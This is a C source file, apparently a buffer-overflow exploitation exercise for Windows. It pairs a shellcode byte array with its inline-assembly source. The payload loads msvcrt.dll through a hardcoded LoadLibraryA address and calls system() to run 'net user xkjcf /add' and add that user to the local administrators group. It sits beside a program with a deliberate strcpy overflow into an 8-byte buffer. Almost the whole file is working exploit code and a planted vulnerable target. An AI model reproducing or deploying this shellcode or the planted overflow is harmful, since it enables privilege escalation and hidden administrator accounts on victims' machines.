#include "StdAfx.h"
#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
char AddUser[]=
"\x55\x8B\xEC\x52\x83\xEC\x40\xC6\x45\xC1\x6D\xC6\x45\xC2\x73\xC6\x45\xC3\x76"
"\xC6\x45\xC4\x63\xC6\x45\xC5\x72\xC6\x45\xC6\x74\xC6\x45\xC7\x2E\xC6\x45\xC8\x64"
"\xC6\x45\xC9\x6C\xC6\x45\xCA\x6C\xC6\x45\xCB\x00\x33\xD2\x8D\x55\xC1\x52\xBA"
"\x04\x28\x28\x75"							//win7下LoadLibraryA的内存地址0x75282804
//"\x77\x1d\x80\x7c"						// xp sp2=0x7c801d77
//"\x7b\x1d\x80\x7c"						//sp3 loadlibrary=0x7c801d7b
"\xFF\xD2\xC6\x45\xC1\x6E\xC6\x45\xC2\x65\xC6\x45\xC3\x74\xC6\x45\xC4\x20"
"\xC6\x45\xC5\x75\xC6\x45\xC6\x73\xC6\x45\xC7\x65\xC6\x45\xC8\x72\xC6\x45\xC9\x20"
"\xC6\x45\xCA\x78\xC6\x45\xCB\x6B\xC6\x45\xCC\x6A\xC6\x45\xCD\x63\xC6\x45\xCE\x66"
"\xC6\x45\xCF\x20\xC6\x45\xD0\x2F\xC6\x45\xD1\x61\xC6\x45\xD2\x64\xC6\x45\xD3\x64"
"\xC6\x45\xD4\x26\xC6\x45\xD5\x6E\xC6\x45\xD6\x65\xC6\x45\xD7\x74\xC6\x45\xD8\x20"
"\xC6\x45\xD9\x6C\xC6\x45\xDA\x6F\xC6\x45\xDB\x63\xC6\x45\xDC\x61\xC6\x45\xDD\x6C"
"\xC6\x45\xDE\x67\xC6\x45\xDF\x72\xC6\x45\xE0\x6F\xC6\x45\xE1\x75\xC6\x45\xE2\x70"  
"\xC6\x45\xE3\x20\xC6\x45\xE4\x61\xC6\x45\xE5\x64\xC6\x45\xE6\x6D\xC6\x45\xE7\x69"
"\xC6\x45\xE8\x6E\xC6\x45\xE9\x69\xC6\x45\xEA\x73\xC6\x45\xEB\x74\xC6\x45\xEC\x72"
"\xC6\x45\xED\x61\xC6\x45\xEE\x74\xC6\x45\xEF\x6F\xC6\x45\xF0\x72\xC6\x45\xF1\x73"
"\xC6\x45\xF2\x20\xC6\x45\xF3\x78\xC6\x45\xF4\x6B\xC6\x45\xF5\x6A\xC6\x45\xF6\x63"
"\xC6\x45\xF7\x66\xC6\x45\xF8\x20\xC6\x45\xF9\x2F\xC6\x45\xFA\x61\xC6\x45\xFB\x64"
"\xC6\x45\xFC\x64\xC6\x45\xFD\x00\x33\xD2\x8D\x55\xC1\x52\xBA"
"\x77\xB1\xd4\x75"						//win7下system函数地址0x776bb177  0x75d4b177	
//"\xc7\x93\xbf\x77"					//xp sp2=0x77bf93c7
//"\xC7\x93\xBF\x77"					//System Address Of Windows Xp Sp3
"\xFF\xD2\x5A\x8B\xE5\x5D\xc3";

char buffer[10240];
int main()
{
/*	__asm{
        lea eax,AddUser
        push eax
        ret
	}
*/
char  input[8];
printf("please input..\n");
scanf("%s",buffer);
strcpy(input,buffer);
printf("input=%s\n",input);
return 0;
}


//////////////////////////////////////////////////////////////////////////////////////
 
/*内联汇编代码*/
int  _main()
{

	 //LoadLibrary在win7下的地址为0x761a2804
	 __asm{
		  //保存现场
		  push ebp
		  mov  ebp, esp
		  push edx
		  sub  esp, 40h
		  /*
		  *msvcrt.dll
		  */
		  mov  byte ptr [ebp-3fh],6dh //m
		  mov  byte ptr [ebp-3eh],73h //s
		  mov  byte ptr [ebp-3dh],76h //v
		  mov  byte ptr [ebp-3ch],63h //c
		  mov  byte ptr [ebp-3bh],72h //r
		  mov  byte ptr [ebp-3ah],74h //t
		  mov  byte ptr [ebp-39h],2eh //.
		  mov  byte ptr [ebp-38h],64h //d
		  mov  byte ptr [ebp-37h],6ch //l
		  mov  byte ptr [ebp-36h],6ch //l
		  mov  byte ptr [ebp-35h],0h //0
		  //调用LoadLibrary加载msvcrt.dll
		  lea  edx, [ebp-3fh]
		  push edx
		  mov  edx, 761a2804h
		  call edx
		  /*
		  * net user xkjcf /add&net localgroup administrators xkjcf /add 共60字节
		  */
		  mov  byte ptr [ebp-3fh],6eh //n
		  mov  byte ptr [ebp-3eh],65h //e
		  mov  byte ptr [ebp-3dh],74h //t
		  mov  byte ptr [ebp-3ch],20h //
		  mov  byte ptr [ebp-3bh],75h //u
		  mov  byte ptr [ebp-3ah],73h //s
		  mov  byte ptr [ebp-39h],65h //e
		  mov  byte ptr [ebp-38h],72h //r
		  mov  byte ptr [ebp-37h],20h //
		  mov  byte ptr [ebp-36h],78h //x
		  mov  byte ptr [ebp-35h],6bh //k
		  mov  byte ptr [ebp-34h],6ah //j
		  mov  byte ptr [ebp-33h],63h //c
		  mov  byte ptr [ebp-32h],66h //f
		  mov  byte ptr [ebp-31h],20h // 
		  mov  byte ptr [ebp-30h],2fh ///
		  mov  byte ptr [ebp-2fh],61h //a
		  mov  byte ptr [ebp-2eh],64h //d
		  mov  byte ptr [ebp-2dh],64h //d
		  mov  byte ptr [ebp-2ch],26h //&
		  mov  byte ptr [ebp-2bh],6eh //n
		  mov  byte ptr [ebp-2ah],65h //e
		  mov  byte ptr [ebp-29h],74h //t
		  mov  byte ptr [ebp-28h],20h // 
		  mov  byte ptr [ebp-27h],6ch //l
		  mov  byte ptr [ebp-26h],6fh //o
		  mov  byte ptr [ebp-25h],63h //c
		  mov  byte ptr [ebp-24h],61h //a
		  mov  byte ptr [ebp-23h],6ch //l
		  mov  byte ptr [ebp-22h],67h //g
		  mov  byte ptr [ebp-21h],72h //r
		  mov  byte ptr [ebp-20h],6fh //o
		  mov  byte ptr [ebp-1fh],75h //u
		  mov  byte ptr [ebp-1eh],70h //p
		  mov  byte ptr [ebp-1dh],20h // 
		  mov  byte ptr [ebp-1ch],61h //a
		  mov  byte ptr [ebp-1bh],64h //d 
		  mov  byte ptr [ebp-1ah],6dh //m 
		  mov  byte ptr [ebp-19h],69h //i 
		  mov  byte ptr [ebp-18h],6eh //n 
		  mov  byte ptr [ebp-17h],69h //i 
		  mov  byte ptr [ebp-16h],73h //s 
		  mov  byte ptr [ebp-15h],74h //t 
		  mov  byte ptr [ebp-14h],72h //r 
		  mov  byte ptr [ebp-13h],61h //a 
		  mov  byte ptr [ebp-12h],74h //t 
		  mov  byte ptr [ebp-11h],6fh //o 
		  mov  byte ptr [ebp-10h],72h //r 
		  mov  byte ptr [ebp-0fh],73h //s 
		  mov  byte ptr [ebp-0eh],20h //  
		  mov  byte ptr [ebp-0dh],78h //x 
		  mov  byte ptr [ebp-0ch],6bh //k 
		  mov  byte ptr [ebp-0bh],6ah //j 
		  mov  byte ptr [ebp-0ah],63h //c 
		  mov  byte ptr [ebp-09h],66h //f 
		  mov  byte ptr [ebp-08h],20h //  
		  mov  byte ptr [ebp-07h],2fh /// 
		  mov  byte ptr [ebp-06h],61h //a 
		  mov  byte ptr [ebp-05h],64h //d 
		  mov  byte ptr [ebp-04h],64h //d 
		  mov  byte ptr [ebp-03h],0h //0 
		  //调用system添加管理员用户xkjcf
		  lea  edx, [ebp-3fh]
		  push edx
		  mov  edx, 776bb177h   //win7下的system地址
		  call edx
		  //还回现场
		  pop  edx
		  mov  esp, ebp
		  pop  ebp
		  //ret
	 }

	return 0;
}